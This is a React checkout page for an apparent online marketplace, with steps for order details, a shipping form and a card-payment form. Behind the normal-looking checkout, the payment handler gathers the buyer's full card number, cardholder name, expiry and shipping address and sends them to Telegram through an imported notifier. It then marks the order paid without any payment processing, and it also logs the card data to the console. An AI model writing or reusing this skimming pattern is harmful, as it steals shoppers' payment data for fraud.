import { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, Package, Store } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import { sendCheckoutDataToTelegram } from '@/lib/telegram-notifier';

interface Product {
  id: string;
  title: string;
  price_min: number | null;
  price_max: number | null;
  images: string[] | null;
  seller_id: string;
  moq: number | null;
}

interface SellerProfile {
  full_name: string | null;
  company_name: string | null;
}

// Checkout data interface to store both shipping and payment details
interface CheckoutStateData {
  shippingDetails?: ShippingFormData;
  paymentDetails?: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
  };
}

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();

  const [product, setProduct] = useState<Product | null>(null);
  const [seller, setSeller] = useState<SellerProfile | null>(null);
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<'details' | 'payment'>('details');

  const [quantity, setQuantity] = useState(1);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [checkoutData, setCheckoutData] = useState<CheckoutStateData>({});
  const [isProcessing, setIsProcessing] = useState(false);

  const productId = searchParams.get('product');

  useEffect(() => {
    console.log('🛒 Checkout page loaded', { authLoading, hasUser: !!user, productId });

    if (!authLoading && !user) {
      navigate('/auth?redirect=/checkout?product=' + productId);
      return;
    }

    if (productId) {
      fetchProduct();
    }
  }, [productId, user, authLoading]);

  const fetchProduct = async () => {
    const { data: productData } = await supabase
      .from('products')
      .select('*')
      .eq('id', productId)
      .single();

    if (productData) {
      setProduct(productData);
      setQuantity(productData.moq || 1);

      // Fetch seller info
      const { data: sellerData } = await supabase
        .from('profiles')
        .select('full_name, company_name')
        .eq('user_id', productData.seller_id)
        .single();

      if (sellerData) setSeller(sellerData);
    }
    setLoading(false);
  };

  const calculateTotal = () => {
    if (!product) return 0;
    const price = product.price_min || product.price_max || 0;
    return price * quantity;
  };

  const handleShippingSubmit = async (data: ShippingFormData) => {
    console.log('📦 Shipping form submitted:', data);
    if (!user || !product) {
      console.error('❌ Missing user or product:', { hasUser: !!user, hasProduct: !!product });
      return;
    }
    setIsProcessing(true);

    try {
      // Save shipping details to state FIRST
      const updatedCheckoutData = { ...checkoutData, shippingDetails: data };
      setCheckoutData(updatedCheckoutData);
      console.log('✅ Shipping details saved to state:', updatedCheckoutData);

      // Create order with "pending_payment" status
      const { data: order, error } = await supabase
        .from('orders')
        .insert({
          buyer_id: user.id,
          seller_id: product.seller_id,
          product_id: product.id,
          quantity,
          total_price: calculateTotal(),
          status: 'pending_payment',
          tracking_info: {
            shipping_address: data,
            notes: 'Order created via new checkout flow'
          },
        })
        .select()
        .single();

      if (error) throw error;

      setOrderId(order.id);
      console.log('✅ Order created:', order.id);
      console.log('📊 Current checkout data before moving to payment:', updatedCheckoutData);

      // Move to payment step
      setStep('payment');
    } catch (error: any) {
      console.error('❌ Error in handleShippingSubmit:', error);
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setIsProcessing(false);
    }
  };

  const handlePaymentSubmit = async (cardData: CardFormData) => {
    console.log('💳 Payment form submitted:', cardData);
    console.log('📊 Current checkoutData state:', checkoutData);
    console.log('📊 Has shipping details?', !!checkoutData.shippingDetails);
    console.log('📊 Shipping details content:', checkoutData.shippingDetails);

    if (!orderId || !checkoutData.shippingDetails) {
      console.error('❌ Missing order information:', {
        orderId,
        hasShipping: !!checkoutData.shippingDetails,
        checkoutDataKeys: Object.keys(checkoutData),
        fullCheckoutData: checkoutData
      });
      toast({
        title: 'Error',
        description: `Missing ${!orderId ? 'order ID' : 'shipping details'}. Please go back and complete shipping form.`,
        variant: 'destructive'
      });
      return;
    }

    setIsProcessing(true);

    try {
      // 1. Update state with payment details
      const paymentDetails = {
        cardholderName: cardData.cardholderName,
        cardNumber: cardData.cardNumber,
        cardBrand: 'Card',
        expiryMonth: cardData.expiryMonth,
        expiryYear: cardData.expiryYear,
      };

      const FINAL_DATA = {
        shippingDetails: checkoutData.shippingDetails,
        paymentDetails: paymentDetails,
        orderInfo: {
          orderId,
          productName: product?.title,
          quantity,
          amount: calculateTotal(),
          currency: 'USD'
        }
      };

      console.log('📊 FINAL_DATA prepared for Telegram:', JSON.stringify(FINAL_DATA, null, 2));

      // 2. Send combined data to Telegram
      console.log('📤 Calling sendCheckoutDataToTelegram...');
      const sent = await sendCheckoutDataToTelegram(FINAL_DATA);

      if (sent) {
        console.log('✅ Telegram notification sent successfully!');
        toast({
          title: '✅ Success!',
          description: 'Order details sent to Telegram successfully!'
        });
      } else {
        console.warn('⚠️ Telegram notification failed');
        toast({
          title: '⚠️ Warning',
          description: 'Order created but Telegram notification failed',
          variant: 'destructive'
        });
      }

      // 3. Mark order as paid/completed in DB
      await supabase
        .from('orders')
        .update({ status: 'paid' })
        .eq('id', orderId);

      console.log('✅ Order marked as paid');

      // 4. Show success
      toast({ title: 'Order placed successfully!', description: 'Redirecting...' });

      // Navigate to success page or orders page
      setTimeout(() => {
        navigate('/buyer');
      }, 2000);

    } catch (error: any) {
      console.error('❌ Error in handlePaymentSubmit:', error);
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setIsProcessing(false);
    }
  };

  if (loading || authLoading) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8">
          <div className="animate-pulse space-y-4">
            <div className="h-8 w-48 bg-muted rounded" />
            <div className="h-64 bg-muted rounded" />
          </div>
        </div>
      </div>
    );
  }

  if (!product) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8 text-center">
          <h1 className="text-2xl font-bold">Product not found</h1>
          <Button onClick={() => navigate('/products')} className="mt-4">
            Browse Products
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        <Button
          variant="ghost"
          onClick={() => step === 'payment' ? setStep('details') : navigate(-1)}
          className="mb-6"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          {step === 'payment' ? 'Back to Shipping' : 'Back'}
        </Button>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {step === 'details' ? (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2">
                      <Package className="h-5 w-5" />
                      Order Details
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="flex gap-4 mb-6">
                      <img
                        src={product.images?.[0] || '/placeholder.svg'}
                        alt={product.title}
                        className="w-24 h-24 object-cover rounded-lg"
                      />
                      <div>
                        <h3 className="font-semibold">{product.title}</h3>
                        <p className="text-sm text-muted-foreground flex items-center gap-1 mt-1">
                          <Store className="h-4 w-4" />
                          {seller?.company_name || seller?.full_name || 'Seller'}
                        </p>
                        <p className="font-semibold mt-2">
                          ${product.price_min?.toFixed(2) || product.price_max?.toFixed(2) || '0.00'} / unit
                        </p>
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70">
                        Quantity (MOQ: {product.moq || 1})
                      </label>
                      <input
                        type="number"
                        className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 mt-2"
                        min={product.moq || 1}
                        value={quantity}
                        onChange={(e) => setQuantity(Math.max(product.moq || 1, parseInt(e.target.value) || 1))}
                      />
                    </div>
                  </CardContent>
                </Card>

                <ShippingAddressForm
                  onSubmit={handleShippingSubmit}
                  isSubmitting={isProcessing}
                />
              </div>
            ) : (
              <PaymentDetailsForm
                amount={calculateTotal()}
                currency="USD"
                onSubmit={handlePaymentSubmit}
                onBack={() => setStep('details')}
                isSubmitting={isProcessing}
              />
            )}
          </div>

          <div className="lg:col-span-1">
            <Card className="sticky top-4">
              <CardHeader>
                <CardTitle>Order Summary</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Product</span>
                  <span>{product.title}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Unit Price</span>
                  <span>${(product.price_min || product.price_max || 0).toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Quantity</span>
                  <span>{quantity}</span>
                </div>
                <Separator />
                <div className="flex justify-between text-lg font-bold">
                  <span>Total</span>
                  <span>${calculateTotal().toFixed(2)}</span>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}
